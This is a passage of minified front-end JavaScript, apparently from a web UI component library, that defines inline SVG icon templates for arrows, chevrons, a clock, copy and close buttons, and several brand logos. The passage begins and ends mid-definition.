    width: var(--local-width);
  }

  svg {
    width: inherit;
    height: inherit;
    object-fit: contain;
    object-position: center;
  }
`,hy=K`<svg fill="none" viewBox="0 0 24 24">
  <path
    style="fill: var(--wui-color-accent-100);"
    d="M10.2 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM10.2 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0Z"
  />
</svg>`,py=K`
<svg width="36" height="36">
  <path
    d="M28.724 0H7.271A7.269 7.269 0 0 0 0 7.272v21.46A7.268 7.268 0 0 0 7.271 36H28.73A7.272 7.272 0 0 0 36 28.728V7.272A7.275 7.275 0 0 0 28.724 0Z"
    fill="url(#a)"
  />
  <path
    d="m17.845 8.271.729-1.26a1.64 1.64 0 1 1 2.843 1.638l-7.023 12.159h5.08c1.646 0 2.569 1.935 1.853 3.276H6.434a1.632 1.632 0 0 1-1.638-1.638c0-.909.73-1.638 1.638-1.638h4.176l5.345-9.265-1.67-2.898a1.642 1.642 0 0 1 2.844-1.638l.716 1.264Zm-6.317 17.5-1.575 2.732a1.64 1.64 0 1 1-2.844-1.638l1.17-2.025c1.323-.41 2.398-.095 3.249.931Zm13.56-4.954h4.262c.909 0 1.638.729 1.638 1.638 0 .909-.73 1.638-1.638 1.638h-2.367l1.597 2.772c.45.788.185 1.782-.602 2.241a1.642 1.642 0 0 1-2.241-.603c-2.69-4.666-4.711-8.159-6.052-10.485-1.372-2.367-.391-4.743.576-5.549 1.075 1.846 2.682 4.631 4.828 8.348Z"
    fill="#fff"
  />
  <defs>
    <linearGradient id="a" x1="18" y1="0" x2="18" y2="36" gradientUnits="userSpaceOnUse">
      <stop stop-color="#18BFFB" />
      <stop offset="1" stop-color="#2072F3" />
    </linearGradient>
  </defs>
</svg>`,my=K`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#000" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M28.77 23.3c-.69 1.99-2.75 5.52-4.87 5.56-1.4.03-1.86-.84-3.46-.84-1.61 0-2.12.81-3.45.86-2.25.1-5.72-5.1-5.72-9.62 0-4.15 2.9-6.2 5.42-6.25 1.36-.02 2.64.92 3.47.92.83 0 2.38-1.13 4.02-.97.68.03 2.6.28 3.84 2.08-3.27 2.14-2.76 6.61.75 8.25ZM24.2 7.88c-2.47.1-4.49 2.69-4.2 4.84 2.28.17 4.47-2.39 4.2-4.84Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,gy=K`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 1.99a1 1 0 0 1 1 1v7.58l2.46-2.46a1 1 0 0 1 1.41 1.42L7.7 13.69a1 1 0 0 1-1.41 0L2.12 9.53A1 1 0 0 1 3.54 8.1L6 10.57V3a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`,wy=K`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M13 7.99a1 1 0 0 1-1 1H4.4l2.46 2.46a1 1 0 1 1-1.41 1.41L1.29 8.7a1 1 0 0 1 0-1.41L5.46 3.1a1 1 0 0 1 1.41 1.42L4.41 6.99H12a1 1 0 0 1 1 1Z"
    clip-rule="evenodd"
  />
</svg>`,by=K`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M1 7.99a1 1 0 0 1 1-1h7.58L7.12 4.53A1 1 0 1 1 8.54 3.1l4.16 4.17a1 1 0 0 1 0 1.41l-4.16 4.17a1 1 0 1 1-1.42-1.41l2.46-2.46H2a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,yy=K`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 13.99a1 1 0 0 1-1-1V5.4L3.54 7.86a1 1 0 0 1-1.42-1.41L6.3 2.28a1 1 0 0 1 1.41 0l4.17 4.17a1 1 0 1 1-1.41 1.41L8 5.4v7.59a1 1 0 0 1-1 1Z"
    clip-rule="evenodd"
  />
</svg>`,vy=K`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4 6.4a1 1 0 0 1-.46.89 6.98 6.98 0 0 0 .38 6.18A7 7 0 0 0 16.46 7.3a1 1 0 0 1-.47-.92 7 7 0 0 0-12 .03Zm-2.02-.5a9 9 0 1 1 16.03 8.2A9 9 0 0 1 1.98 5.9Z"
    clip-rule="evenodd"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.03 8.63c-1.46-.3-2.72-.75-3.6-1.35l-.02-.01-.14-.11a1 1 0 0 1 1.2-1.6l.1.08c.6.4 1.52.74 2.69 1 .16-.99.39-1.88.67-2.65.3-.79.68-1.5 1.15-2.02A2.58 2.58 0 0 1 9.99 1c.8 0 1.45.44 1.92.97.47.52.84 1.23 1.14 2.02.29.77.52 1.66.68 2.64a8 8 0 0 0 2.7-1l.26-.18h.48a1 1 0 0 1 .12 2c-.86.51-2.01.91-3.34 1.18a22.24 22.24 0 0 1-.03 3.19c1.45.29 2.7.73 3.58 1.31a1 1 0 0 1-1.1 1.68c-.6-.4-1.56-.76-2.75-1-.15.8-.36 1.55-.6 2.2-.3.79-.67 1.5-1.14 2.02-.47.53-1.12.97-1.92.97-.8 0-1.45-.44-1.91-.97a6.51 6.51 0 0 1-1.15-2.02c-.24-.65-.44-1.4-.6-2.2-1.18.24-2.13.6-2.73.99a1 1 0 1 1-1.1-1.67c.88-.58 2.12-1.03 3.57-1.31a22.03 22.03 0 0 1-.04-3.2Zm2.2-1.7c.15-.86.34-1.61.58-2.24.24-.65.51-1.12.76-1.4.25-.28.4-.29.42-.29.03 0 .17.01.42.3.25.27.52.74.77 1.4.23.62.43 1.37.57 2.22a19.96 19.96 0 0 1-3.52 0Zm-.18 4.6a20.1 20.1 0 0 1-.03-2.62 21.95 21.95 0 0 0 3.94 0 20.4 20.4 0 0 1-.03 2.63 21.97 21.97 0 0 0-3.88 0Zm.27 2c.13.66.3 1.26.49 1.78.24.65.51 1.12.76 1.4.25.28.4.29.42.29.03 0 .17-.01.42-.3.25-.27.52-.74.77-1.4.19-.5.36-1.1.49-1.78a20.03 20.03 0 0 0-3.35 0Z"
    clip-rule="evenodd"
  />
</svg>`,xy=K`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M12.04 2.65c.47.3.6.91.3 1.38l-5.78 9a1 1 0 0 1-1.61.1L1.73 9.27A1 1 0 1 1 3.27 8L5.6 10.8l5.05-7.85a1 1 0 0 1 1.38-.3Z"
    clip-rule="evenodd"
  />
</svg>`,_y=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M1.46 4.96a1 1 0 0 1 1.41 0L8 10.09l5.13-5.13a1 1 0 1 1 1.41 1.41l-5.83 5.84a1 1 0 0 1-1.42 0L1.46 6.37a1 1 0 0 1 0-1.41Z"
    clip-rule="evenodd"
  />
</svg>`,Ey=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M11.04 1.46a1 1 0 0 1 0 1.41L5.91 8l5.13 5.13a1 1 0 1 1-1.41 1.41L3.79 8.71a1 1 0 0 1 0-1.42l5.84-5.83a1 1 0 0 1 1.41 0Z"
    clip-rule="evenodd"
  />
</svg>`,Cy=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.96 14.54a1 1 0 0 1 0-1.41L10.09 8 4.96 2.87a1 1 0 0 1 1.41-1.41l5.84 5.83a1 1 0 0 1 0 1.42l-5.84 5.83a1 1 0 0 1-1.41 0Z"
    clip-rule="evenodd"
  />
</svg>`,Sy=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M14.54 11.04a1 1 0 0 1-1.41 0L8 5.92l-5.13 5.12a1 1 0 1 1-1.41-1.41l5.83-5.84a1 1 0 0 1 1.42 0l5.83 5.84a1 1 0 0 1 0 1.41Z"
    clip-rule="evenodd"
  />
</svg>`,Ay=K`<svg width="36" height="36" fill="none">
  <path
    fill="#fff"
    fill-opacity=".05"
    d="M0 14.94c0-5.55 0-8.326 1.182-10.4a9 9 0 0 1 3.359-3.358C6.614 0 9.389 0 14.94 0h6.12c5.55 0 8.326 0 10.4 1.182a9 9 0 0 1 3.358 3.359C36 6.614 36 9.389 36 14.94v6.12c0 5.55 0 8.326-1.182 10.4a9 9 0 0 1-3.359 3.358C29.386 36 26.611 36 21.06 36h-6.12c-5.55 0-8.326 0-10.4-1.182a9 9 0 0 1-3.358-3.359C0 29.386 0 26.611 0 21.06v-6.12Z"
  />
  <path
    stroke="#fff"
    stroke-opacity=".05"
    d="M14.94.5h6.12c2.785 0 4.84 0 6.46.146 1.612.144 2.743.43 3.691.97a8.5 8.5 0 0 1 3.172 3.173c.541.948.826 2.08.971 3.692.145 1.62.146 3.675.146 6.459v6.12c0 2.785 0 4.84-.146 6.46-.145 1.612-.43 2.743-.97 3.691a8.5 8.5 0 0 1-3.173 3.172c-.948.541-2.08.826-3.692.971-1.62.145-3.674.146-6.459.146h-6.12c-2.784 0-4.84 0-6.46-.146-1.612-.145-2.743-.43-3.691-.97a8.5 8.5 0 0 1-3.172-3.173c-.541-.948-.827-2.08-.971-3.692C.5 25.9.5 23.845.5 21.06v-6.12c0-2.784 0-4.84.146-6.46.144-1.612.43-2.743.97-3.691A8.5 8.5 0 0 1 4.79 1.617C5.737 1.076 6.869.79 8.48.646 10.1.5 12.156.5 14.94.5Z"
  />
  <path
    fill="url(#a)"
    d="M17.998 10.8h12.469a14.397 14.397 0 0 0-24.938.001l6.234 10.798.006-.001a7.19 7.19 0 0 1 6.23-10.799Z"
  />
  <path
    fill="url(#b)"
    d="m24.237 21.598-6.234 10.798A14.397 14.397 0 0 0 30.47 10.798H18.002l-.002.006a7.191 7.191 0 0 1 6.237 10.794Z"
  />
  <path
    fill="url(#c)"
    d="M11.765 21.601 5.531 10.803A14.396 14.396 0 0 0 18.001 32.4l6.235-10.798-.004-.004a7.19 7.19 0 0 1-12.466.004Z"
  />
  <path fill="#fff" d="M18 25.2a7.2 7.2 0 1 0 0-14.4 7.2 7.2 0 0 0 0 14.4Z" />
  <path fill="#1A73E8" d="M18 23.7a5.7 5.7 0 1 0 0-11.4 5.7 5.7 0 0 0 0 11.4Z" />
  <defs>
    <linearGradient
      id="a"
      x1="6.294"
      x2="41.1"
      y1="5.995"
      y2="5.995"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#D93025" />
      <stop offset="1" stop-color="#EA4335" />
    </linearGradient>
    <linearGradient
      id="b"
      x1="20.953"
      x2="37.194"
      y1="32.143"
      y2="2.701"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#FCC934" />
      <stop offset="1" stop-color="#FBBC04" />
    </linearGradient>
    <linearGradient
      id="c"
      x1="25.873"
      x2="9.632"
      y1="31.2"
      y2="1.759"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#1E8E3E" />
      <stop offset="1" stop-color="#34A853" />
    </linearGradient>
  </defs>
</svg>`,Ty=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 2.99a5 5 0 1 0 0 10 5 5 0 0 0 0-10Zm-7 5a7 7 0 1 1 14 0 7 7 0 0 1-14 0Zm7-4a1 1 0 0 1 1 1v2.58l1.85 1.85a1 1 0 0 1-1.41 1.42L6.29 8.69A1 1 0 0 1 6 8v-3a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`,Iy=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z"
    clip-rule="evenodd"
  />
</svg>`,$y=K`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10 3a7 7 0 0 0-6.85 8.44l8.29-8.3C10.97 3.06 10.49 3 10 3Zm3.49.93-9.56 9.56c.32.55.71 1.06 1.16 1.5L15 5.1a7.03 7.03 0 0 0-1.5-1.16Zm2.7 2.8-9.46 9.46a7 7 0 0 0 9.46-9.46ZM1.99 5.9A9 9 0 1 1 18 14.09 9 9 0 0 1 1.98 5.91Z"
    clip-rule="evenodd"
  />
</svg>`,Oy=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M8 2a6 6 0 1 0 0 12A6 6 0 0 0 8 2ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm10.66-2.65a1 1 0 0 1 .23 1.06L9.83 9.24a1 1 0 0 1-.59.58l-2.83 1.06A1 1 0 0 1 5.13 9.6l1.06-2.82a1 1 0 0 1 .58-.59L9.6 5.12a1 1 0 0 1 1.06.23ZM7.9 7.89l-.13.35.35-.13.12-.35-.34.13Z"
    clip-rule="evenodd"
  />
</svg>`,Py=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.5 0h1.67c.68 0 1.26 0 1.73.04.5.05.97.14 1.42.4.52.3.95.72 1.24 1.24.26.45.35.92.4 1.42.04.47.04 1.05.04 1.73V6.5c0 .69 0 1.26-.04 1.74-.05.5-.14.97-.4 1.41-.3.52-.72.95-1.24 1.25-.45.25-.92.35-1.42.4-.43.03-.95.03-1.57.03 0 .62 0 1.14-.04 1.57-.04.5-.14.97-.4 1.42-.29.52-.72.95-1.24 1.24-.44.26-.92.35-1.41.4-.48.04-1.05.04-1.74.04H4.83c-.68 0-1.26 0-1.73-.04-.5-.05-.97-.14-1.42-.4-.52-.3-.95-.72-1.24-1.24a3.39 3.39 0 0 1-.4-1.42A20.9 20.9 0 0 1 0 11.17V9.5c0-.69 0-1.26.04-1.74.05-.5.14-.97.4-1.41.3-.52.72-.95 1.24-1.25.45-.25.92-.35 1.42-.4.43-.03.95-.03 1.57-.03 0-.62 0-1.14.04-1.57.04-.5.14-.97.4-1.42.29-.52.72-.95 1.24-1.24.44-.26.92-.35 1.41-.4A20.9 20.9 0 0 1 9.5 0ZM4.67 6.67c-.63 0-1.06 0-1.4.03-.35.03-.5.09-.6.14-.2.12-.38.3-.5.5-.05.1-.1.24-.14.6C2 8.32 2 8.8 2 9.54v1.59c0 .73 0 1.22.03 1.6.04.35.1.5.15.6.11.2.29.38.5.5.09.05.24.1.6.14.37.03.86.03 1.6.03h1.58c.74 0 1.22 0 1.6-.03.36-.04.5-.1.6-.15.2-.11.38-.29.5-.5.05-.09.1-.24.14-.6.03-.33.03-.76.03-1.39-.6 0-1.13 0-1.57-.04-.5-.04-.97-.14-1.41-.4-.52-.29-.95-.72-1.25-1.24a3.39 3.39 0 0 1-.4-1.41c-.03-.44-.03-.96-.03-1.57Zm3.27-4.64c-.36.04-.5.1-.6.15-.2.11-.38.29-.5.5-.05.09-.1.24-.14.6-.03.37-.03.86-.03 1.6v1.58c0 .74 0 1.22.03 1.6.03.36.09.5.14.6.12.2.3.38.5.5.1.05.24.1.6.14.38.03.86.03 1.6.03h1.59c.73 0 1.22 0 1.6-.03.35-.03.5-.09.6-.14.2-.12.38-.3.5-.5.05-.1.1-.24.14-.6.03-.38.03-.86.03-1.6V4.87c0-.73 0-1.22-.03-1.6a1.46 1.46 0 0 0-.15-.6c-.11-.2-.29-.38-.5-.5-.09-.05-.24-.1-.6-.14-.37-.03-.86-.03-1.6-.03H9.55c-.74 0-1.22 0-1.6.03Z"
    clip-rule="evenodd"
  />
</svg>`,Dy=K` <svg fill="none" viewBox="0 0 13 4">
  <path fill="currentColor" d="M.5 0h12L8.9 3.13a3.76 3.76 0 0 1-4.8 0L.5 0Z" />
</svg>`,Ry=K`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M13.66 2H6.34c-1.07 0-1.96 0-2.68.08-.74.08-1.42.25-2.01.68a4 4 0 0 0-.89.89c-.43.6-.6 1.27-.68 2.01C0 6.38 0 7.26 0 8.34v.89c0 1.07 0 1.96.08 2.68.08.74.25 1.42.68 2.01a4 4 0 0 0 .89.89c.6.43 1.27.6 2.01.68a27 27 0 0 0 2.68.08h7.32a27 27 0 0 0 2.68-.08 4.03 4.03 0 0 0 2.01-.68 4 4 0 0 0 .89-.89c.43-.6.6-1.27.68-2.01.08-.72.08-1.6.08-2.68v-.89c0-1.07 0-1.96-.08-2.68a4.04 4.04 0 0 0-.68-2.01 4 4 0 0 0-.89-.89c-.6-.43-1.27-.6-2.01-.68C15.62 2 14.74 2 13.66 2ZM2.82 4.38c.2-.14.48-.25 1.06-.31C4.48 4 5.25 4 6.4 4h7.2c1.15 0 1.93 0 2.52.07.58.06.86.17 1.06.31a2 2 0 0 1 .44.44c.14.2.25.48.31 1.06.07.6.07 1.37.07 2.52v.77c0 1.15 0 1.93-.07 2.52-.06.58-.17.86-.31 1.06a2 2 0 0 1-.44.44c-.2.14-.48.25-1.06.32-.6.06-1.37.06-2.52.06H6.4c-1.15 0-1.93 0-2.52-.06-.58-.07-.86-.18-1.06-.32a2 2 0 0 1-.44-.44c-.14-.2-.25-.48-.31-1.06C2 11.1 2 10.32 2 9.17V8.4c0-1.15 0-1.93.07-2.52.06-.58.17-.86.31-1.06a2 2 0 0 1 .44-.44Z"
    clip-rule="evenodd"
  />
  <path fill="currentColor" d="M6.14 17.57a1 1 0 1 0 0 2h7.72a1 1 0 1 0 0-2H6.14Z" />
</svg>`,Ny=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.07 1h.57a1 1 0 0 1 0 2h-.52c-.98 0-1.64 0-2.14.06-.48.05-.7.14-.84.24-.13.1-.25.22-.34.35-.1.14-.2.35-.25.83-.05.5-.05 1.16-.05 2.15v2.74c0 .99 0 1.65.05 2.15.05.48.14.7.25.83.1.14.2.25.34.35.14.1.36.2.84.25.5.05 1.16.05 2.14.05h.52a1 1 0 0 1 0 2h-.57c-.92 0-1.69 0-2.3-.07a3.6 3.6 0 0 1-1.8-.61c-.3-.22-.57-.49-.8-.8a3.6 3.6 0 0 1-.6-1.79C.5 11.11.5 10.35.5 9.43V6.58c0-.92 0-1.7.06-2.31a3.6 3.6 0 0 1 .62-1.8c.22-.3.48-.57.79-.79a3.6 3.6 0 0 1 1.8-.61C4.37 1 5.14 1 6.06 1ZM9.5 3a1 1 0 0 1 1.42 0l4.28 4.3a1 1 0 0 1 0 1.4L10.93 13a1 1 0 0 1-1.42-1.42L12.1 9H6.8a1 1 0 1 1 0-2h5.3L9.51 4.42a1 1 0 0 1 0-1.41Z"
    clip-rule="evenodd"
  />
</svg>`,ky=K`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5865F2" />
      <path
        fill="#fff"
        fill-rule="evenodd"
        d="M25.71 28.15C30.25 28 32 25.02 32 25.02c0-6.61-2.96-11.98-2.96-11.98-2.96-2.22-5.77-2.15-5.77-2.15l-.29.32c3.5 1.07 5.12 2.61 5.12 2.61a16.75 16.75 0 0 0-10.34-1.93l-.35.04a15.43 15.43 0 0 0-5.88 1.9s1.71-1.63 5.4-2.7l-.2-.24s-2.81-.07-5.77 2.15c0 0-2.96 5.37-2.96 11.98 0 0 1.73 2.98 6.27 3.13l1.37-1.7c-2.6-.79-3.6-2.43-3.6-2.43l.58.35.09.06.08.04.02.01.08.05a17.25 17.25 0 0 0 4.52 1.58 14.4 14.4 0 0 0 8.3-.86c.72-.27 1.52-.66 2.37-1.21 0 0-1.03 1.68-3.72 2.44.61.78 1.35 1.67 1.35 1.67Zm-9.55-9.6c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28.01-1.25-.93-2.28-2.1-2.28Zm7.5 0c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28 0-1.25-.93-2.28-2.1-2.28Z"
        clip-rule="evenodd"
      />
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
  </defs>
</svg>`,My=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="M4.25 7a.63.63 0 0 0-.63.63v3.97c0 .28-.2.51-.47.54l-.75.07a.93.93 0 0 1-.9-.47A7.51 7.51 0 0 1 5.54.92a7.5 7.5 0 0 1 9.54 4.62c.12.35.06.72-.16 1-.74.97-1.68 1.78-2.6 2.44V4.44a.64.64 0 0 0-.63-.64h-1.06c-.35 0-.63.3-.63.64v5.5c0 .23-.12.42-.32.5l-.52.23V6.05c0-.36-.3-.64-.64-.64H7.45c-.35 0-.64.3-.64.64v4.97c0 .25-.17.46-.4.52a5.8 5.8 0 0 0-.45.11v-4c0-.36-.3-.65-.64-.65H4.25ZM14.07 12.4A7.49 7.49 0 0 1 3.6 14.08c4.09-.58 9.14-2.5 11.87-6.6v.03a7.56 7.56 0 0 1-1.41 4.91Z"
  />
</svg>`,Uy=K`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.71 2.99a.57.57 0 0 0-.57.57 1 1 0 0 1-1 1c-.58 0-.96 0-1.24.03-.27.03-.37.07-.42.1a.97.97 0 0 0-.36.35c-.04.08-.09.21-.11.67a2.57 2.57 0 0 1 0 5.13c.02.45.07.6.11.66.09.15.21.28.36.36.07.04.21.1.67.12a2.57 2.57 0 0 1 5.12 0c.46-.03.6-.08.67-.12a.97.97 0 0 0 .36-.36c.03-.04.07-.14.1-.41.02-.29.03-.66.03-1.24a1 1 0 0 1 1-1 .57.57 0 0 0 0-1.15 1 1 0 0 1-1-1c0-.58 0-.95-.03-1.24a1.04 1.04 0 0 0-.1-.42.97.97 0 0 0-.36-.36 1.04 1.04 0 0 0-.42-.1c-.28-.02-.65-.02-1.24-.02a1 1 0 0 1-1-1 .57.57 0 0 0-.57-.57ZM5.15 13.98a1 1 0 0 0 .99-1v-.78a.57.57 0 0 1 1.14 0v.78a1 1 0 0 0 .99 1H8.36a66.26 66.26 0 0 0 .73 0 3.78 3.78 0 0 0 1.84-.38c.46-.26.85-.64 1.1-1.1.23-.4.32-.8.36-1.22.02-.2.03-.4.03-.63a2.57 2.57 0 0 0 0-4.75c0-.23-.01-.44-.03-.63a2.96 2.96 0 0 0-.35-1.22 2.97 2.97 0 0 0-1.1-1.1c-.4-.22-.8-.31-1.22-.35a8.7 8.7 0 0 0-.64-.04 2.57 2.57 0 0 0-4.74 0c-.23 0-.44.02-.63.04-.42.04-.83.13-1.22.35-.46.26-.84.64-1.1 1.1-.33.57-.37 1.2-.39 1.84a21.39 21.39 0 0 0 0 .72v.1a1 1 0 0 0 1 .99h.78a.57.57 0 0 1 0 1.15h-.77a1 1 0 0 0-1 .98v.1a63.87 63.87 0 0 0 0 .73c0 .64.05 1.27.38 1.83.26.47.64.85 1.1 1.11.56.32 1.2.37 1.84.38a20.93 20.93 0 0 0 .72 0h.1Z"
    clip-rule="evenodd"
  />
</svg>`,By=K`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.74 3.99a1 1 0 0 1 1-1H11a1 1 0 0 1 1 1v6.26a1 1 0 0 1-2 0V6.4l-6.3 6.3a1 1 0 0 1-1.4-1.42l6.29-6.3H4.74a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,Ly=K`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1877F2" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M26 12.38h-2.89c-.92 0-1.61.38-1.61 1.34v1.66H26l-.36 4.5H21.5v12H17v-12h-3v-4.5h3V12.5c0-3.03 1.6-4.62 5.2-4.62H26v4.5Z"
        />
      </g>
    </g>
    <path
      fill="#1877F2"
      d="M40 20a20 20 0 1 0-23.13 19.76V25.78H11.8V20h5.07v-4.4c0-5.02 3-7.79 7.56-7.79 2.19 0 4.48.4 4.48.4v4.91h-2.53c-2.48 0-3.25 1.55-3.25 3.13V20h5.54l-.88 5.78h-4.66v13.98A20 20 0 0 0 40 20Z"
    />
    <path
      fill="#fff"
      d="m27.79 25.78.88-5.78h-5.55v-3.75c0-1.58.78-3.13 3.26-3.13h2.53V8.2s-2.3-.39-4.48-.39c-4.57 0-7.55 2.77-7.55 7.78V20H11.8v5.78h5.07v13.98a20.15 20.15 0 0 0 6.25 0V25.78h4.67Z"
    />
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,jy=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 3a1 1 0 0 1 1-1h14a1 1 0 1 1 0 2H1a1 1 0 0 1-1-1Zm2.63 5.25a1 1 0 0 1 1-1h8.75a1 1 0 1 1 0 2H3.63a1 1 0 0 1-1-1Zm2.62 5.25a1 1 0 0 1 1-1h3.5a1 1 0 0 1 0 2h-3.5a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,Fy=K`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1B1F23" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M8 19.89a12 12 0 1 1 15.8 11.38c-.6.12-.8-.26-.8-.57v-3.3c0-1.12-.4-1.85-.82-2.22 2.67-.3 5.48-1.31 5.48-5.92 0-1.31-.47-2.38-1.24-3.22.13-.3.54-1.52-.12-3.18 0 0-1-.32-3.3 1.23a11.54 11.54 0 0 0-6 0c-2.3-1.55-3.3-1.23-3.3-1.23a4.32 4.32 0 0 0-.12 3.18 4.64 4.64 0 0 0-1.24 3.22c0 4.6 2.8 5.63 5.47 5.93-.34.3-.65.83-.76 1.6-.69.31-2.42.84-3.5-1 0 0-.63-1.15-1.83-1.23 0 0-1.18-.02-.09.73 0 0 .8.37 1.34 1.76 0 0 .7 2.14 4.03 1.41v2.24c0 .31-.2.68-.8.57A12 12 0 0 1 8 19.9Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,Wy=K`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#fff" fill-opacity=".05" />
      <g clip-path="url(#c)">
        <path
          fill="#4285F4"
          d="M20 17.7v4.65h6.46a5.53 5.53 0 0 1-2.41 3.61l3.9 3.02c2.26-2.09 3.57-5.17 3.57-8.82 0-.85-.08-1.67-.22-2.46H20Z"
        />
        <path
          fill="#34A853"
          d="m13.27 22.17-.87.67-3.11 2.42A12 12 0 0 0 20 31.9c3.24 0 5.96-1.07 7.94-2.9l-3.9-3.03A7.15 7.15 0 0 1 20 27.12a7.16 7.16 0 0 1-6.72-4.94v-.01Z"
        />
        <path
          fill="#FBBC05"
          d="M9.29 14.5a11.85 11.85 0 0 0 0 10.76l3.99-3.1a7.19 7.19 0 0 1 0-4.55l-4-3.1Z"
        />
        <path
          fill="#EA4335"
          d="M20 12.66c1.77 0 3.34.61 4.6 1.8l3.43-3.44A11.51 11.51 0 0 0 20 7.89c-4.7 0-8.74 2.69-10.71 6.62l3.99 3.1A7.16 7.16 0 0 1 20 12.66Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,zy=K`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
